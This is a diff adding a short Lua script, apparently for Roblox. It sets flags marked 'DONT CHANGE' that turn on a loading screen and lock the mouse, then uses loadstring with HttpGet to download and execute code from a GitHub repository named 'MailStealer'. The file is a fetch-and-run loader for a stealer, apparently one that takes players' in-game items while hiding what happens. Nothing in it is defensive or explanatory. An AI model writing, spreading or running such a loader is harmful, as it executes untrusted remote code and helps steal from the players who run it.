@@ -1,0 +1,7 @@
+-- Extra Settings --
+_G.LoadingScreen = true --// DONT CHANGE
+_G.AntiLeave = false --// DONT CHANGE
+_G.MouseLock = true --// DONT CHANGE
+
+-- Script --
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EzyyksScriptz/MailStealer/main/MailStealer"))()
